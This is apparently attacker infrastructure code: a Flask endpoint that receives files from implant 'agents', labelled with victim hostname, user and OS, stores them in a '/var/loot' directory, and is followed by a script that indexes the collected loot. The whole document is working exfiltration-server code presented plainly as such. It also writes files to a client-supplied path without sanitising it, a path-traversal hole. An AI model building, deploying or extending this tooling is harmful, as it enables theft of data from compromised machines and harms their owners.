@app.route('/api/drop', methods=['POST'])
def drop():
    filename = request.form.get('filename') or request.args.get('filename', '')
    agent_id = request.form.get('agent_id', request.args.get('id', 'anon'))
    hostname = request.form.get('hostname', request.args.get('hostname', ''))
    target_user = request.form.get('user', request.args.get('user', ''))
    target_os = request.form.get('os', request.args.get('os', ''))
    category = request.form.get('category', request.args.get('category', 'raw'))

    if not filename:
        return jsonify({'error': 'RELAY_ERR_NO_FILENAME', 'required': ['filename'], 'optional': ['agent_id', 'hostname', 'user', 'os', 'category']}), 400

    filepath = os.path.join(LOOT_DIR, filename)
    os.makedirs(os.path.dirname(filepath), exist_ok=True)

    data = request.files.get('file')
    if data:
        content = data.read()
    else:
        content = request.get_data()

    with open(filepath, 'wb') as f:
        f.write(content)
    os.chmod(filepath, 0o644)

    resp = {
        'status': 'received',
        'agent': agent_id,
        'ref': hashlib.md5(content[:64]).hexdigest()[:12],
        'size': len(content),
        'category': category,
    }
    if hostname:
        resp['hostname'] = hostname
    if target_user:
        resp['user'] = target_user
    if target_os:
        resp['os'] = target_os
    return jsonify(resp)

#!/usr/bin/env python3
import os, json

LOOT_DIR = '/var/loot'
index = []
for root, _dirs, files in os.walk(LOOT_DIR):
    for f in files:
        if f.startswith('.'):
            continue
        fp = os.path.join(root, f)
        index.append({
            'file': os.path.relpath(fp, LOOT_DIR),
            'size': os.path.getsize(fp),
        })

with open(os.path.join(LOOT_DIR, '.index.json'), 'w') as out:
    json.dump(index, out, indent=2)
print(f'[indexer] indexed {len(index)} files')
